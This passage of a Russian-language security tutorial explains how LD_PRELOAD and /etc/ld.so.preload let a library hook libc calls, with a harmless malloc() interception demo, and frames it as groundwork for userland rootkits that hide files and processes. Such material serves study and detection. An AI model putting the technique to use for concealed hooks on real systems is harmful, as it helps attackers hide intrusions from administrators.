<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">
<html><head><meta name="qrichtext" content="1" /><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><style type="text/css">
p, li { white-space: pre-wrap; }
</style></head><body style=" font-family:'DejaVu Sans'; font-size:11pt; font-weight:400; font-style:normal;">
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="lead1"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> юник­сах сущес­тву­ет перемен­ная сре­ды, при ука­зании которой нужные биб­лиоте­ки будут заг­ружать­ся рань­ше осталь­ных. А это зна­чит, что появ­ляет­ся воз­можность под­менить сис­темные вызовы. Называ­ется перемен­ная </span><a name="code1"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD, и в этой статье мы под­робно обсу­дим ее зна­чение в сок­рытии (и обна­руже­нии!) рут­китов.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p1"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">О</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">фи­циаль­но глав­ное пред­назна­чение LD_PRELOAD — отладка или про­вер­ка фун­кций в динами­чес­ки под­клю­чаемых биб­лиоте­ках. Если не хочет­ся исправ­лять и переком­пилиро­вать саму биб­лиоте­ку, то мож­но вос­поль­зовать­ся перемен­ной сре­ды.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p2"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">К</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> при­меру, если нам нуж­но пред­загру­зить биб­лиоте­ку ld.so, то у нас будет два спо­соба:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'DejaVu LGC Sans'; font-size:12pt;"><br /></p>
<ol style="margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; -qt-list-indent: 1;"><li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:12px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Ус­тановить перемен­ную сре­ды <a name="code2"></a>LD_PRELOAD с фай­лом биб­лиоте­ки.</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">За­писать путь к биб­лиоте­ке в файл <a name="code3"></a>/etc/ld.so.preload.</li></ol>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p3"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> пер­вом слу­чае мы объ­явля­ем перемен­ную с биб­лиоте­кой для текуще­го поль­зовате­ля и его окру­жения. Во вто­ром же наша биб­лиоте­ка будет заг­ружена рань­ше осталь­ных для </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">всех</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> поль­зовате­лей сис­темы.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p4"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Н</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ам инте­ресен как раз вто­рой спо­соб: имен­но он час­то исполь­зует­ся в рут­китах для перех­вата некото­рых вызовов, таких как чте­ние фай­ла, лис­тинг дирек­тории, про­цес­сов и про­чих фун­кций, поз­воля­ющих зло­умыш­ленни­ку скры­вать свое при­сутс­твие в сис­теме.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p5"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> осно­ве это­го иссле­дова­ния — пуб­ликация Абхи­нава Тха­кура </span><a href="https://compilepeace.medium.com/memory-malware-part-0x2-writing-userland-rootkits-via-ld-preload-30121c8343d5"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">Crafting LD_PRELOAD Rootkits in Userland</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">.</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc01."></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h2 style=" margin-top:16px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Переопределение системных вызовов</span></h2>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p6"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">реж­де чем мы нач­нем сбли­жение с реаль­ными фун­кци­ями рут­китов, давай на неболь­шом при­мере покажу, как мож­но перех­ватить вызов стан­дар­тной фун­кции </span><a href="https://www.gnu.org/software/libc/manual/html_node/The-GNU-Allocator.html"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">malloc()</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p7"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Д</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ля это­го напишем прос­тую прог­рамму, которая выделя­ет блок памяти с помощью фун­кции </span><a name="code4"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc(), затем помеща­ет в него фун­кци­ей </span><a name="code5"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">s</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">trncpy() стро­ку «I’ll be back» и выводит ее пос­редс­твом </span><a name="code6"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">f</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">printf() по адре­су, который вер­нула </span><a name="code7"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc().</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p8"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">С</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">оз­даем файл </span><a name="code8"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">c</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">all_malloc.c:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdio.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;string.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdlib.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;unistd.h&gt;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">int main()</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  char *alloc = (char *)malloc(0x100);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  strncpy(alloc, &quot;I'll be back\0&quot;, 14);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  fprintf(stderr, &quot;malloc(): %p\nStr: %s\n&quot;, alloc, alloc);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p9"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь напишем прог­рамму, пере­опре­деля­ющую </span><a name="code10"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc(). Внут­ри — фун­кция с тем же име­нем, что и в libc. Наша фун­кция не дела­ет ничего, кро­ме вывода стро­ки в </span><a name="code11"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">S</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">TDERR c помощью </span><a name="code12"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">f</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">printf().</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p10"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">С</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">оз­дадим файл </span><a name="code13"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibmalloc.c:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define _GNU_SOURCE</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;dlfcn.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdlib.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdio.h&gt;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">void *malloc(size_t size)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  fprintf(stderr, &quot;\nHijacked malloc(%ld)\n\n&quot;, size);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  return 0;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p11"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь с помощью GCC ском­пилиру­ем наш код:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ ls</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">call_malloc.c libmalloc.c</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ gcc -Wall -fPIC -shared -o libmalloc.so libmalloc.c -ldl</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ gcc -o call_malloc call_malloc.c</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ ls</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">call_malloc call_malloc.c libmalloc.c libmalloc.so</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p14"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ы­пол­ним нашу прог­рамму </span><a name="code19"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">c</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">all_malloc:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ ./call_malloc</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">malloc(): 0x5585b2466260</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">Str: I'll be back</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p16"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ос­мотрим, какие биб­лиоте­ки исполь­зует наша прог­рамма, с помощью ути­литы </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ldd</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ ldd ./call_malloc</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">linux-vdso.so.1 (0x00007fff0cd81000)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0d35c74000)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">/lib64/ld-linux-x86-64.so.2 (0x00007f0d35e50000)</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p18"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">О</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">т­лично вид­но, что без исполь­зования пред­загруз­чика </span><a name="code22"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD стан­дар­тно заг­ружа­ются три биб­лиоте­ки:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'DejaVu LGC Sans'; font-size:12pt;"><br /></p>
<ol style="margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; -qt-list-indent: 1;"><li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:12px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code23"></a>linux-vdso.so.1 — пред­став­ляет собой <span style=" font-weight:600;">вир­туаль­ный динами­чес­кий раз­деля­емый объ­ект</span> (Virtual Dynamic Shared Object, vDSO), который при­меня­ется для опти­миза­ции час­то исполь­зуемых сис­темных вызовов. Его мож­но игно­риро­вать (под­робнее — <a name="code24"></a>man 7 vdso).</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code25"></a>libc.so.6 — биб­лиоте­ка libc с исполь­зуемой нами фун­кци­ей <a name="code26"></a>malloc() в прог­рамме <a name="code27"></a>call_malloc.</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code28"></a>ld-linux-x86-64.so.2 — сам динами­чес­кий ком­понов­щик.</li></ol>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p19"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь давай опре­делим перемен­ную </span><a name="code29"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD и поп­робу­ем перех­ватить </span><a name="code30"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc(). Здесь я не буду исполь­зовать export и огра­ничусь однос­троч­ной коман­дой для прос­тоты:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ LD_PRELOAD=./libmalloc.so ./call_malloc</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">Hijacked malloc(256)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">Ошиб­ка сег­менти­рова­ния</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p21"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">М</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ы успешно перех­ватили </span><a name="code32"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc() из биб­лиоте­ки </span><a name="code33"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibc.so, но сде­лали это не сов­сем чис­то. Фун­кция воз­вра­щает зна­чение ука­зате­ля NULL, что при разыме­нова­нии </span><a name="code34"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">s</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">trncpy() в прог­рамме </span><a name="code35"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">.</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/call_malloc вызыва­ет ошиб­ку сег­менти­рова­ния. Испра­вим это.</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc02."></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h2 style=" margin-top:16px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Обработка сбоев</span></h2>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p22"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Ч</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">то­бы иметь воз­можность незамет­но выпол­нить полез­ную наг­рузку рут­кита, нам нуж­но вер­нуть зна­чение, которое вер­нула бы пер­воначаль­но выз­ванная фун­кция. У нас есть два спо­соба решить эту проб­лему:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'DejaVu LGC Sans'; font-size:12pt;"><br /></p>
<ul style="margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; -qt-list-indent: 1;"><li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:12px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">на­ша фун­кция <a name="code36"></a>malloc() дол­жна реали­зовы­вать фун­кци­ональ­ность <a name="code37"></a>malloc() биб­лиоте­ки libc по зап­росу поль­зовате­ля. Это пол­ностью изба­вит от необ­ходимос­ти исполь­зовать <a name="code38"></a>malloc() из <a name="code39"></a>libc.so;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code40"></a>libmalloc.so каким‑то обра­зом дол­жна иметь воз­можность вызывать <a name="code41"></a>malloc() из биб­лиоте­ки libc и воз­вра­щать резуль­таты вызыва­ющей прог­рамме.</li></ul>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
